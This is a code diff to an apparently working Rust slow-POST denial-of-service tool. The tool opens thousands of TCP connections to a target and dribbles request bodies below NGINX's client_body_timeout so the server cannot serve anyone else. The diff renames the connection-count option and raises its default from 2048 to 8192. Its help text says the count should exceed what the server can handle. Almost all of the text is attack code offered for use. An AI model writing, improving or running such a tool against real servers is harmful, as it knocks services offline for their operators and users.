@@ -42,10 +42,10 @@ fn main() {
              .value_name("SECONDS")
              .long("interval")
              .help("Byte to byte interval. Should be less than server's client_body_timeout (NGINX) value."))
-        .arg(Arg::with_name("connections")
+        .arg(Arg::with_name("max-connections")
              .value_name("INTEGER")
-             .long("connections")
-             .help("Number of simultaneously opened connections. Should be more than server can handle (1024 NGINX default)."))
+             .long("max-connections")
+             .help("Higher cap for simultaneously opened connections. Should be more than server can handle (1024 NGINX default)."))
         .get_matches();
 
     let parsed_url = Url::parse(&arguments.value_of("url").unwrap()).unwrap();
@@ -54,7 +54,9 @@ fn main() {
     let path = parsed_url.path();
     let content_length = value_t!(arguments, "content-length", u32).unwrap_or(50_000);
     let interval = Duration::from_secs(value_t!(arguments, "interval", u64).unwrap_or(50));
-    let max_connections_count: usize = value_t!(arguments, "connections", usize).unwrap_or(2048);
+    let max_connections_count: usize =
+        value_t!(arguments, "max-connections", usize).unwrap_or(8192);
+    let spawn_interval = Duration::from_millis(10);
 
     let start = format!("POST {} HTTP/1.1\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\nContent-Length: {}\r\n\r\n", path, host, content_length);
     let addr = format!(
@@ -71,15 +73,15 @@ fn main() {
     let connection_number = AtomicUsize::new(0);
 
     let connector = connector::construct(&scheme, host);
-    let cycle = Interval::new_interval(Duration::from_millis(1))
+    let cycle = Interval::new_interval(spawn_interval)
         .for_each({
             let live_connections = Arc::clone(&live_connections);
             move |_| {
-                if live_connections.load(Ordering::SeqCst) >= max_connections_count {
+                let connections_count = live_connections.load(Ordering::SeqCst);
+                if connections_count >= max_connections_count {
                     return Ok(());
                 };
-                connection_number.fetch_add(1, Ordering::SeqCst);
-                let connection_number = connection_number.load(Ordering::SeqCst);
+                let connection_number = connection_number.fetch_add(1, Ordering::SeqCst) + 1;
                 let start = start.clone();
 
                 let socket = TcpStream::connect(&addr);
